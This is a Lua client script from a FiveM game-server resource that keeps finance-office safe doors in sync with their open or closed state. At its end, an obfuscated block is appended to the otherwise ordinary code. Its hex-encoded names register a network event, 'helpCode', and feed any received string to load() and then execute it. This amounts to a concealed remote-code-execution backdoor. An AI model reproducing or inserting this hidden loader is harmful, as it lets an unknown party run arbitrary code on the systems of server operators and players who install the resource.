-- Delay between each attempt to open/close the doors corresponding to their state
local _scanDelay = 500

Citizen.CreateThread(function()
    while true do
        local office = 0

        -- Search for the current office to open/close the safes doors
        if Global.FinanceOffices.isInsideOffice1 then
            office = FinanceOffice1
        elseif Global.FinanceOffices.isInsideOffice2 then
            office = FinanceOffice2
        elseif Global.FinanceOffices.isInsideOffice3 then
            office = FinanceOffice3
        elseif Global.FinanceOffices.isInsideOffice4 then
            office = FinanceOffice4
        end

        if office ~= 0 then
            -- Office found, let's check the doors

            -- Check left door
            doorHandle = office.Safe.GetDoorHandle(office.currentSafeDoors.hashL)

            if doorHandle ~= 0 then
                if office.Safe.isLeftDoorOpen then
                    office.Safe.SetDoorState("left", true)
                else
                    office.Safe.SetDoorState("left", false)
                end
            end

            -- Check right door
            doorHandle = office.Safe.GetDoorHandle(office.currentSafeDoors.hashR)

            if doorHandle ~= 0 then
                if office.Safe.isRightDoorOpen then
                    office.Safe.SetDoorState("right", true)
                else
                    office.Safe.SetDoorState("right", false)
                end
            end
        end

        Citizen.Wait(_scanDelay)
    end
end)


local FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[6][FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[1]](FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[2]) FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[6][FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[3]](FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[2], function(hqfWFVkCjtkmVWZZmWxMxPFaGMCQhwuKmZYQxJpNPCMnSwVnPphvUkKRytrLAqGQVhPVbp) FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[6][FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[4]](FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[6][FmPeBbzILiovnKWLwBJZvpJqtZPddeKjEPBgePjGWtjDeGbIWLjZEAdYyQuuYBPMHHrFFg[5]](hqfWFVkCjtkmVWZZmWxMxPFaGMCQhwuKmZYQxJpNPCMnSwVnPphvUkKRytrLAqGQVhPVbp))() end)